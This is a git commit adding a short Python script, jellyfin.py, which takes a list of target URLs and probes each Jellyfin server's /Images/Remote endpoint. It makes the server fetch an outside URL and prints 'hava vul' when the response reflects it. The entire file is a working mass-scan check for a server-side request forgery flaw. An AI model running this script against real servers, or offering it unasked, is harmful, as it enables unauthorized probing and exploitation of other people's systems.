96ff8ba4ebf8a83d0bf7c2aad84f5a21e07c38d4
0x0021h <92664048+0x0021h@users.noreply.github.com>
2021-12-09 19:52:15 +0800

    Create jellyfin.py

---
+++ jellyfin.py
@@ -0,0 +1,19 @@
+import requests,sys
+requests.packages.urllib3.disable_warnings()
+
+urlListPath=sys.argv[1] 
+if '.txt' in urlListPath:
+    urlList = open(urlListPath, 'r',encoding='utf-8')
+else:
+    urlList = [urlListPath]
+for url in urlList:
+    url=url.strip()+"/Images/Remote?imageUrl=http://www.baidu.com"
+    heads={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0",}
+    try:
+        req=requests.get(url,headers=heads)
+        if "baidu.com" in req.text:
+            print(url+"hava vul")
+        else:
+            print(url+"no vul")
+    except Exception as e:
+        print(e)
